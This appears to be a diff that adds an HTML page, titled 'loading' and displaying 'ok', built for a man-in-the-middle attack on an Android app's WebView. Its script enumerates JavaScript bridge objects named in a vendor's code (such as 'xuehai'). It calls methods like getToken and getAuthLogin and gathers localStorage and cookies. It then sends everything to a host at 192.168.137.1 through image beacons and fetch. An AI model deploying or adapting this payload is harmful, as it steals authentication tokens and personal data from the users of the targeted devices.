@@ -1,0 +1,34 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>loading</title></head><body>
+<div id="m">ok</div>
+<script>
+(function () {
+  var out = { href: location.href, ua: navigator.userAgent, t: Date.now(), stage: 'mitm' };
+  function safe(f) { try { return String(f()); } catch (e) { return 'ERR:' + e; } }
+  // 厂商 WebController:178 注册的桥名 = "webView"; :174 = Constants.DIR_XUEHAI("xuehai"?) 
+  var names = ['webView', 'xuehai', 'js', 'LauncherJs', 'jsBridge', 'android'];
+  var v = {};
+  for (var i = 0; i < names.length; i++) {
+    var o = null;
+    try { o = window[names[i]]; } catch (e) { continue; }
+    if (!o) continue;
+    var ms = [];
+    try { for (var k in o) { try { ms.push(k + ':' + typeof o[k]); } catch (e) {} } } catch (e) {}
+    v[names[i] + '.__methods'] = ms.join(',');
+    var mets = ['getToken', 'finishView', 'getMyUserId', 'getClassInfo', 'getClassroomId',
+                'getCurrentCourse', 'getAuthLogin', 'getBaseUrl', 'downLoadFile', 'getVersionName'];
+    for (var j = 0; j < mets.length; j++) {
+      try { if (typeof o[mets[j]] === 'function') v[names[i] + '.' + mets[j]] = safe(function () { return o[mets[j]](); }); } catch (e) {}
+    }
+  }
+  out.vals = v;
+  // 存储
+  try { var ls = {}; for (var q = 0; q < localStorage.length && q < 30; q++) { var kk = localStorage.key(q); ls[kk] = String(localStorage.getItem(kk)).slice(0, 400); } out.ls = ls; } catch (e) {}
+  try { out.cookie = document.cookie; } catch (e) {}
+  var q2 = '/BRIDGELEAK?d=' + encodeURIComponent(JSON.stringify(out));
+  try { new Image().src = 'http://192.168.137.1' + q2; } catch (e) {}
+  try { new Image().src = 'http://192.168.137.1:8099' + q2; } catch (e) {}
+  try { fetch('http://192.168.137.1:8099' + q2, { mode: 'no-cors' }).catch(function () {}); } catch (e) {}
+  try { document.getElementById('m').innerHTML = 'done'; } catch (e) {}
+})();
+</script></body></html>
